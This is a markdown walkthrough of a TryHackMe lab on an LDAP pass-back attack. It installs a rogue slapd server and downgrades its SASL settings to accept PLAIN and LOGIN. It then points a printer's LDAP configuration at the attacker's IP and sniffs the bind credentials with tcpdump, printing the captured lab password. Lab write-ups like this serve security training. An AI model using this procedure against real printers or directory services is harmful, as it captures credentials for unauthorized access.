# Perform LDAP Pass Back with Rogue LDAP Server


```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Configuration of the LDAP Server: 
```
sudo dpkg-reconfigure -p low slapd
```

![image](https://user-images.githubusercontent.com/97956863/231549315-b8217585-523e-4f32-b296-81616c29b3c5.png)

Provide the targeted domain 
![image](https://user-images.githubusercontent.com/97956863/231549375-bbf2317d-71d1-494c-b8a2-de0477d33ec6.png)

![image](https://user-images.githubusercontent.com/97956863/231549473-76f36c6d-6dc9-4f86-a236-22feaf534217.png)

![image](https://user-images.githubusercontent.com/97956863/231549889-8d492cde-5c27-4f43-9bd7-2d216828a54c.png)

![image](https://user-images.githubusercontent.com/97956863/231549924-f5df1ecf-1b5e-4a3f-a5cc-cf7205111b4b.png)

![image](https://user-images.githubusercontent.com/97956863/231549949-6453268e-757d-4355-afa2-6784a1d655c2.png)

# Making it vulnerable by downgrading it to support PLAIN & LOGIN !

```
nano olcSaslSecProps.ldif 
```

```
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

<ul> 
  <li>olcSaslSecProps: Specifies the SASL security properties <br>
  <li>noanonymous: Disables mechanisms that support anonymous login <br>
  <li>minssf: Specifies the minimum acceptable security strength with 0, meaning no protection. <br>
</ul>



# Patch LDAP Server

```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
Check new config :
```
┌──(root㉿kali)-[~]
└─# ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN

```


# Capturing LDAP Creds (TryHackMe example with printer.za.tryhackme.com)

Changing server to the tun0 ip address : 10.50.26.19 
Then click save

![image](https://user-images.githubusercontent.com/97956863/231569418-d86a2329-a712-4f07-96b9-add6f33a74a6.png)

Before clicking Test on kali :

```
sudo tcpdump -SX -i breachad tcp port 389

```

Click Test !!

![image](https://user-images.githubusercontent.com/97956863/231570152-26fc6cd4-773d-4e18-b4b7-42516d716de7.png)


As we can see the password at the bottom of the screen : tryhackmeldappass1@

<br>
<br>

Credit : TryHackMe
